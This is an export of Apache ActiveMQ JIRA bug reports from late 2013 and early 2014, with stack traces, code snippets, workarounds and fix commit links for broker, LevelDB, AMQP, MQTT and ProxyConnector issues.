;;;","17/Dec/13 20:22;tabish;I've added one fix that ensures that when dispatched to Topic consumers we don't do concurrent writes to the same Message object.  ;;;","08/Jan/14 17:38;tabish;[~kearls] I believe this is resolved now, can you confirm that and close this if you are satisfied that its fixed. ;;;","28/Mar/14 19:18;gurilubana;Is there a workaround for this bug. I am using qpid-java-amqp-1-0-client-jms-0.26 and still hit this error.;;;","31/Mar/14 15:32;kearls;Unfortunately there's no workaround in 5.9, you'd need to use a 5.10-SNAPSHOT.;;;","01/Apr/14 17:51;gurilubana;So essentially multiple topic consumers even running from different instances do not work. This pretty much makes publish-subscribe system unworkable since in any production environment you would have more than 1 subscriber to the same topic. Or is there any other way.?
Btw any idea when 5.10 is coming out.
Also is it the broker or client problem?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
LevelDB store can fail when using durable subs,AMQ-4917,12682713,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,chirino,chirino,chirino,04/Dec/13 16:02,07/Jun/14 20:30,14/Jul/23 05:43,06/Dec/13 14:43,5.9.0,,,,,5.10.0,5.9.1,,Broker,,,,1,,,,,,,,,"Tenzin giatso  original reported this issue in AMQ-4837 :

The broker stopped 3 times this night after about 6h50min, then 6h50 min then 50min.
The error sounds to be the saùme (except the line number in class) but the broker restart automaticly with the snapshot.
2013-11-19 05:27:43,671 | INFO | Stopping BrokerService[localhost] due to exception, java.io.IOException | org.apache.activemq.util.DefaultIOExceptionHandler | LevelDB IOException handler.
java.io.IOException
at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:39)
at org.apache.activemq.leveldb.LevelDBClient.might_fail(LevelDBClient.scala:554)
at org.apache.activemq.leveldb.LevelDBClient.might_fail_using_index(LevelDBClient.scala:1021)
at org.apache.activemq.leveldb.LevelDBClient.collectionCursor(LevelDBClient.scala:1320)
at org.apache.activemq.leveldb.LevelDBClient.queueCursor(LevelDBClient.scala:1244)
at org.apache.activemq.leveldb.DBManager.cursorMessages(DBManager.scala:708)
at org.apache.activemq.leveldb.LevelDBStore$LevelDBMessageStore.recover(LevelDBStore.scala:747)
at org.apache.activemq.broker.region.Topic.doBrowse(Topic.java:588)
at org.apache.activemq.broker.region.Topic.access$100(Topic.java:65)
at org.apache.activemq.broker.region.Topic$6.run(Topic.java:721)
at org.apache.activemq.thread.SchedulerTimerTask.run(SchedulerTimerTask.java:33)
at java.util.TimerThread.mainLoop(Unknown Source)
at java.util.TimerThread.run(Unknown Source)
Caused by: java.lang.NullPointerException
at org.apache.activemq.leveldb.LevelDBClient$$anonfun$queueCursor$1.apply(LevelDBClient.scala:1248)
It's not easy to reproduce. It's better with the snapshot but i can't say that no messages are lost with leveldb.",,artnaseef,meurwinn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4837,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,361970,,,Sat Jun 07 20:30:51 UTC 2014,,,,,,,,,,,"0|i1qe8n:",362265,,,,,,,,,,,,,,,,,,,,,"04/Dec/13 17:24;chirino;Ok. I think this one should be fixed now.  Fix is included in the following builds for anyone who wants to double check.

https://repository.apache.org/content/repositories/snapshots/org/apache/activemq/apache-activemq/5.10-SNAPSHOT/apache-activemq-5.10-20131204.171817-28-bin.tar.gz

https://repository.apache.org/content/repositories/snapshots/org/apache/activemq/apache-activemq/5.10-SNAPSHOT/apache-activemq-5.10-20131204.171817-28-bin.zip;;;","05/Dec/13 08:52;meurwinn;Hi,
thank you for your help.
i'll try the snapshot right now.
I'll keep you in touch.;;;","06/Dec/13 09:12;meurwinn;Hi, good news !

AMQ is processing since yesterday afternoon, with about 150 messages/second.
It has delivered about 8 000 000 messages without any lots messages.
And the good news is that the errors has NOT occured since the beginning of the test. So no error, no reboot, no slow processing !

I let the test running until monday morning and i'll post some news but i think the fix is ok.

Thank you guys !;;;","06/Dec/13 14:43;chirino;Thanks for checking the fix.  Resolving as fixed.;;;","06/Dec/13 14:48;meurwinn;Ok, about 10 800 000 messages processed without any error.

Thanks.;;;","07/Jun/14 20:30;artnaseef;Git commit: https://git-wip-us.apache.org/repos/asf?p=activemq.git;a=commit;h=8378cb1ffc77715d3c9c8a173805f037afa2935a;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
AMQP consumer hangs when receiving large messages,AMQ-4914,12682167,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,kearls,kearls,kearls,02/Dec/13 16:39,02/Apr/14 22:11,14/Jul/23 05:43,09/Jan/14 09:31,5.9.0,,,,,5.10.0,5.9.1,,AMQP,,,,1,,,,,,,,,The AMQP client hangs when trying to receive messages > 32k.  I will add a test that reproduces this.,,gsim,kearls,tabish,tom_m,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,361424,,,Thu Jan 09 09:31:02 UTC 2014,,,,,,,,,,,"0|i1qawn:",361723,,,,,,,,,,,,,,,,,,,,,"09/Dec/13 23:31;tabish;We seem to be sending the correct amount of data out for the target message, so we probably need to dig into the AMQP JMS client code to see what's going on during the message unmarshal in order to get a better idea of what's going on. ;;;","10/Dec/13 22:18;tabish;The issue in the code seems to stem from a max header frame size value in the AMQP client code.  When the value is greater than the default 32768 than an error is triggered.  This doesn't unblock the receive call though just drops the incoming message so that's why this test case fails.  If you tweak the max frame size value in the code then things start working.;;;","10/Dec/13 23:20;tabish;Appears that we aren't setting the max frame size option on the proton transport which causes the QPid JMS side to then default to its preset 32768 value.  We need to ensure that we set the max frame size before the transport is considered initialized otherwise it throws an IllegalStateException.;;;","11/Dec/13 15:24;tabish;Seems that setting the max frame size on the proton Transport to much more than 1mb causes issues either in proton or with the QPid JMS client code.  The default in the JMS client is set at 32768 by default, maybe there's a reason for that given the maturity of that code base. ;;;","12/Dec/13 21:58;tom_m;Can anyone please clarify this issue?  Is this a productive issue, in which version? Does the problem only occur in specific combinations with activemq as amqp broker and qpid client only? Why is the qpid jms client mentioned when amqp is the protocol used? 
This would have an impact in evaluating activemq + amqp for my project. Thanks. ;;;","12/Dec/13 22:03;tabish;This occurs in our test against the QPid JMS client: http://qpid.apache.org/components/qpid-jms/

Tests against the client 0.24 and above show this issue.  YMMV with other clients, we haven't tested.  ;;;","12/Dec/13 23:45;tom_m;Hi Timothy, 
thanks for your explanation and updates for this issue. 
Do you know about any plans and a concrete timeline for release 5.10 having this one fixed? ;;;","12/Dec/13 23:49;tabish;First we'd need to figure out if its a broker or client issue.  Releases are done when they're done, no definite time line for this.  ;;;","08/Jan/14 22:15;gsim;I think this may be addressed by https://issues.apache.org/jira/browse/QPID-5456;;;","09/Jan/14 09:31;kearls;Fixed by Tim's latest change and QPID-5456.  Thanks Gordon.
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Windows batch script doesn't like spaces in installation path,AMQ-4910,12681930,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,matthew.kusnierz@gmail.com,matthew.kusnierz@gmail.com,29/Nov/13 17:53,23/Dec/14 16:38,14/Jul/23 05:43,05/Dec/13 17:03,5.9.0,,,,,5.10.0,5.9.1,,Broker,,,,0,,,,,,,,,"If you unzip the binary distribution to ""C:\Program Files\apache-active-mq-5.9.0"" or any directory that contains a space in it, the bin\activemq.bat file fails to start. With the error message:

Error: Could not find or load main class Files\apache-activemq-5.9.0\bin\..\conf\login.config

Work-around - either unzip to a directory with no spaces, or set the ACTIVEMQ_HOME environment variable to the short version of the path, e.g. 

set ACTIVEMQ_HOME=c:\Progra~1\apache-activemq-5.9.0
",Windows 7,illojones,matthew.kusnierz@gmail.com,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-5243,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,361191,,,Thu Dec 05 17:03:13 UTC 2013,,,,,,,,,,,"0|i1q9gv:",361490,,,,,,,,,,,,,,,,,,,,,"05/Dec/13 16:25;illojones;Seems like this is caused by one of the new java arguments from commit 981c8e247f11871265a20a48e463096028188f36; I was able to work around this by putting double quotes around the path in the following line: 

{code}wrapper.java.additional.15=-Djava.security.auth.login.config=%ACTIVEMQ_CONF%/login.config{code}

;;;","05/Dec/13 17:03;tabish;Update the wrapper.conf files with quotes around the new login config file definition. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
kahadb - do some sanity check on the index when checkForCorruptJournalFiles,AMQ-4907,12681809,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,28/Nov/13 21:11,02/Apr/14 23:40,14/Jul/23 05:43,29/Nov/13 12:33,5.9.0,,,,,5.10.0,5.9.1,,Message Store,,,,0,checkForCorruptJournalFiles,corrupt,index,kahadb,,,,,"When the index is corrupt all bets are off and we need to replay the journal to rebuild the index. We do this automatically on a failure to load the index. When the index loads and is still corrupt, we can resume and messages are unavailable.
Adding some sanity checking to the index, when checkForCorruptJournalFiles is enabled (paranoid mode)  will allow us to detect corruption and force an auto recreation.
",,gtully,tmielke,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,361073,,,Fri Nov 29 12:33:04 UTC 2013,,,,,,,,,,,"0|i1q8qn:",361372,,,,,,,,,,,,,,,,,,,,,"29/Nov/13 12:33;gtully;fix in http://git-wip-us.apache.org/repos/asf/activemq/commit/06f24e2e;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
advisory producerCount = 0 is not received on temporary queue,AMQ-4906,12681674,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,rajdavies,cmamen,cmamen,27/Nov/13 22:30,03/Dec/14 20:36,14/Jul/23 05:43,28/Nov/13 12:58,5.7.0,,,,,5.10.0,,,Broker,,,,0,,,,,,,,,"i notice i never receive producer advisory messages (ActiveMQ.Advisory.Producer.Queue .[...]) with producerCount=0 when the client message producers on temporary queue are closed. i do receive producerCount > 0. 

However, the consumerCount (from ActiveMQ.Advisory.Consumer.Queue.[...]) appears to work as expected.

From looking into org.apache.activemq.advisory.AdvisoryBroker.java
{code}
@Override
    public void removeProducer(ConnectionContext context, ProducerInfo info) throws Exception {
        super.removeProducer(context, info);

        // Don't advise advisory topics.
        ActiveMQDestination dest = info.getDestination();
        if (info.getDestination() != null && !AdvisorySupport.isAdvisoryTopic(dest)) {
            ActiveMQTopic topic = AdvisorySupport.getProducerAdvisoryTopic(dest);
            producers.remove(info.getProducerId());
            if (!dest.isTemporary() || destinations.contains(dest)) { // PLEASE NOTE: <== could this actually be destinations.containsKey(dest)
                fireProducerAdvisory(context, dest,topic, info.createRemoveCommand());
            }
        }
    }
{code}

as reference, the ""working"" removeConsumer method:
{code}
@Override
    public void removeConsumer(ConnectionContext context, ConsumerInfo info) throws Exception {
        super.removeConsumer(context, info);

        // Don't advise advisory topics.
        ActiveMQDestination dest = info.getDestination();
        if (!AdvisorySupport.isAdvisoryTopic(dest)) {
            ActiveMQTopic topic = AdvisorySupport.getConsumerAdvisoryTopic(dest);
            consumers.remove(info);
            if (!dest.isTemporary() || destinations.containsKey(dest)) {
                fireConsumerAdvisory(context,dest, topic, info.createRemoveCommand());
            }
        }
    }
{code}

Please note the destinations.containsKey(dest) vs destinations.contains(dest) (for concurrentHashMaps this is identical to containsValue()). I'm assuming the logic is to make sure the producer destination do exist in both cases

I tested this with 5.7.0. the code is similar in 5.9.0

",,artnaseef,cmamen,rajdavies,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-5474,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,360938,,,Sat Jun 07 20:30:04 UTC 2014,,,,,,,,,,,"0|i1q7wv:",361237,,,,,,,,,,,,,,,,,,,,,"09/Dec/13 19:32;cmamen;[~rajdavies] Hi, will you commit a fix to the trunk prior to 5.10.0 release ?
;;;","09/Dec/13 19:36;rajdavies;It should be in trunk already - you could try it with the latest SNAPSHOT - see https://repository.apache.org/content/repositories/snapshots/org/apache/activemq/apache-activemq/;;;","09/Dec/13 22:55;cmamen;Yes it is, i didnt see it properly, thanks;;;","10/Dec/13 05:29;rajdavies;Phew! I always worry I might have done something stupid! Thanks Christian for the fix!;;;","07/Jun/14 20:30;artnaseef;Git commit: https://git-wip-us.apache.org/repos/asf?p=activemq.git;a=commit;h=11781d3cf2a351ea5f3ef80f29f351ac42d3538e
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
runtime config - embed spring beans schema to avoid trip to the internet in osgi land,AMQ-4905,12681606,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,27/Nov/13 16:03,02/Apr/14 23:40,14/Jul/23 05:43,07/Mar/14 12:26,5.9.0,,,,,5.10.0,5.9.1,,,,,,0,osgi,runtime-configuration,spring,xds,,,,,"to validate the xml at runtime using jaxb, the schema needs to be provided to the jaxbcontext but spring schema resolution through spring.schemas does not work. Simplest approach is to embed the dependent schemas and pull them from the containing jar via getResource

This avoids a roundtrip to the net at runtime.",,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,360870,,,Fri Mar 07 12:26:13 UTC 2014,,,,,,,,,,,"0|i1q7hz:",361169,,,,,,,,,,,,,,,,,,,,,"07/Mar/14 12:26;gtully;fix in
https://github.com/apache/activemq/commit/eead6e511083fa1c1a9595f8671a722630afb1e2;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
jdbc ioexception handler can restart transports in error after lease expriy,AMQ-4904,12681558,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,27/Nov/13 12:37,02/Apr/14 23:41,14/Jul/23 05:43,27/Nov/13 12:55,5.9.0,,,,,5.10.0,5.9.1,,Message Store,,,,0,ioexceptionhandler,jdbc,lease,restart,,,,,"When the db is unavailable the jdbcioexception handler will suspend by stopping the transport connectors and will await a successful checkpoint on the jdbc store before a restart.

If the db becomes available btween the check for lock and the checkpoint, it is possible to try and restart the transports without the lock, in error.

We need to validate the lock after we stop our wait for the checkpoint.",,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,360822,,,Wed Nov 27 12:55:55 UTC 2013,,,,,,,,,,,"0|i1q77b:",361121,,,,,,,,,,,,,,,,,,,,,"27/Nov/13 12:55;gtully;fix and test in http://git-wip-us.apache.org/repos/asf/activemq/commit/7d98b320;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Multiple consumers of the same virtual topic queue cannot have different message selectors,AMQ-4899,12680562,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,kearls,mcnealr,mcnealr,21/Nov/13 17:58,02/Apr/14 21:50,14/Jul/23 05:43,07/Feb/14 08:45,5.x,,,,,5.10.0,5.9.1,,Broker,,,,0,,,,,,,,,"If two consumers of the same virtual topic queue have different message selectors, only one selector gets cached via the SubQueueSelectorCacheBroker.java. The problem is when the consumers are offline. Because the cache only caches one selector, the broker will only allow messages that ""pass"" the cached selector to be put in the queue. All other messages that may be intended for the other consumer will be lost. The fix would allow multiple selectors to be cached per Virtual Topic Consumer queue vs. one.",,kearls,mcnealr,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/Feb/14 09:45;kearls;AMQ4899Test.java;https://issues.apache.org/jira/secure/attachment/12626858/AMQ4899Test.java","04/Feb/14 18:56;mcnealr;AMQ4899Test2.java;https://issues.apache.org/jira/secure/attachment/12626936/AMQ4899Test2.java",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,359827,,,Fri Feb 07 08:45:11 UTC 2014,,,,,,,,,,,"0|i1q13b:",360126,,,,,,,,,,,,,,,,,,,,,"21/Jan/14 19:46;tabish;Do you have a JUnit test case that can reproduce this?;;;","21/Jan/14 19:49;mcnealr;Sorry, I do not.;;;","04/Feb/14 09:45;kearls;Hi Ralph.  I've attached a unit test that I wrote to try to reproduce this.  However, it works correctly for me.  Can you take a look and tell me if you were doing something differently?
;;;","04/Feb/14 18:56;mcnealr;Your unit test had the default VirtualTopic settings configured on the broker and did not have both consumers on the same queue. See attached modifications.;;;","07/Feb/14 08:45;kearls;Updated SubQueueSelectorCacheBroker and SelectorAwareVirtualTopicInterceptor to handle more than one selector per topic. 

Ralph, thanks for the updated test.
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MQTT does not properly restore durable subs with the Paho client.,AMQ-4896,12679765,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,chirino,chirino,chirino,18/Nov/13 17:11,18/Nov/13 21:10,14/Jul/23 05:43,18/Nov/13 21:10,5.9.0,,,,,5.10.0,,,Broker,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,359123,,,2013-11-18 17:11:14.0,,,,,,,,,,,"0|i1pwrj:",359422,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
UTF8Buffer should be a valid object for setObjectProperty,AMQ-4893,12679489,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,shendley,shendley,15/Nov/13 21:15,11/Jun/14 01:18,14/Jul/23 05:43,25/Nov/13 19:49,5.8.0,,,,,5.10.0,5.9.1,,JMS client,,,,0,,,,,,,,,If we try to copy headers between messages using getProperties and setObjectProperty with those values it now fails since the UTF8Buffer is not in the whitelist of convertable types. I think it should be added as a whitelisted type that gets handled like a string on setObjectProperty (and probably setStringProperty). Otherwise this causes the application code to have to special case String properties and couple to the hawtbuffer implementation detail.,,artnaseef,shendley,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4180,,,,,,,,,,,,,"25/Nov/13 17:26;shendley;StringHeaderTest.java;https://issues.apache.org/jira/secure/attachment/12615623/StringHeaderTest.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,358849,,,Wed Jun 11 01:18:14 UTC 2014,,,,,,,,,,,"0|i1puzj:",359139,Regression,,,,,,,,,,,,,,,,,,,,"15/Nov/13 21:16;shendley;AMQ-4180 was the feature that added this regression;;;","15/Nov/13 21:33;tabish;Recommend you create a unit test, and even better a patch for the issue. ;;;","25/Nov/13 17:26;shendley;Attached is test case showing the exception when a string property is copied from an unmarshaled message to another message using setObjectProperty.

Suggested fix is to add UTF8Buffer to the checkValidObject whitelist.;;;","25/Nov/13 19:49;tabish;fixed on trunk;;;","26/Nov/13 17:29;shendley;Thanks!;;;","11/Jun/14 01:18;artnaseef;Fix revision: https://git-wip-us.apache.org/repos/asf?p=activemq.git;a=commit;h=a6e306437efafc13cf2c2e9d681d5685fdfbcfce;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MQTT clients disconnecting due to socket error do not publish the configured last will and testament message.,AMQ-4892,12679484,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,chirino,chirino,chirino,15/Nov/13 20:50,23/Jun/14 17:38,14/Jul/23 05:43,03/Apr/14 00:33,5.9.0,,,,,5.10.0,5.9.1,,Broker,,,,1,,,,,,,,,,,artnaseef,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4692,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,358844,,,Wed Jun 11 01:19:16 UTC 2014,,,,,,,,,,,"0|i1puyf:",359134,,,,,,,,,,,,,,,,,,,,,"11/Jun/14 01:19;artnaseef;Fix revision: https://git-wip-us.apache.org/repos/asf?p=activemq.git;a=commit;h=030c2cca31fa41dc938b7a6a5904c90bfce6dfac

Comment from the commit: ""MQTT clients disconnecting due to socket error do not publish the configured last will and testament message."";;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ProxyConnector memory usage skyrockets when several ssl handshakes fails,AMQ-4889,12679366,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,matteor,matteor,15/Nov/13 09:41,02/Apr/14 22:16,14/Jul/23 05:43,16/Dec/13 17:14,5.8.0,5.9.0,,,,5.10.0,5.9.1,,Broker,,,,0,,,,,,,,,"See [nabble|http://activemq.2283324.n4.nabble.com/Proxy-Connector-memory-consumption-td4674255.html] for further details.

To reproduce the issue:
# Start embedded proxy broker and the AMQ broker that are embedded in *AMQTestBroker* project (see attachments);
# Start the *AMQTestConsumer* project; This program repeatedly tries opening a connection to the ProxyConnector with wrong certificates.
# Open jconsole to monitor AMQTestBroker memory usage: you should experience an OOM error within one hour with the suggested settings (Xmx = 2048m).

Launch configurations and test keystores are attached to this issue along with the java projects.

This behavior seems to affect _ProxyConnector_ only, running the test against a standard nio-based _TransportConnector_ does not seem to produce anomalous memory consumptions.
","Seen in Windows 7 64bit, Windows Server 2008 R2 and Linux RHEL 6.3 64 bit",kearls,matteor,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/Dec/13 16:13;tabish;AMQ4889.patch;https://issues.apache.org/jira/secure/attachment/12617002/AMQ4889.patch","29/Nov/13 11:33;matteor;NIOSSLTransport_patch_AMQ_4889.txt;https://issues.apache.org/jira/secure/attachment/12616363/NIOSSLTransport_patch_AMQ_4889.txt","15/Nov/13 09:42;matteor;ProxyConnIssue.rar;https://issues.apache.org/jira/secure/attachment/12614047/ProxyConnIssue.rar","04/Dec/13 16:37;matteor;ProxyConnection_patch_AMQ_4889.txt;https://issues.apache.org/jira/secure/attachment/12617007/ProxyConnection_patch_AMQ_4889.txt","04/Dec/13 16:37;matteor;ProxyConnector_patch_AMQ_4889.txt;https://issues.apache.org/jira/secure/attachment/12617008/ProxyConnector_patch_AMQ_4889.txt","29/Nov/13 11:33;matteor;after_lsof.txt;https://issues.apache.org/jira/secure/attachment/12616367/after_lsof.txt","29/Nov/13 11:33;matteor;after_netstat.txt;https://issues.apache.org/jira/secure/attachment/12616368/after_netstat.txt","29/Nov/13 11:33;matteor;lsof.txt;https://issues.apache.org/jira/secure/attachment/12616364/lsof.txt","29/Nov/13 11:33;matteor;netstat.txt;https://issues.apache.org/jira/secure/attachment/12616365/netstat.txt","29/Nov/13 11:33;matteor;sockstat.txt;https://issues.apache.org/jira/secure/attachment/12616366/sockstat.txt",,,,,,,,,,,,10.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,358728,,,Mon Dec 16 17:14:48 UTC 2013,,,,,,,,,,,"0|i1pu8n:",359018,,,,,,,,,,,,,,,,,,,,,"29/Nov/13 07:35;matteor;I attached a possible patch. As long as I can see, the problem was adding ProxyConnection objs into a collection inside ProxyConnector before starting them.

Maybe an amq guru can check this and gives some feedbacks?

Thanks!;;;","29/Nov/13 11:31;matteor;Actually the problem in ProxyConnector hid something more than a simple problem ProxyConnector.java file. 

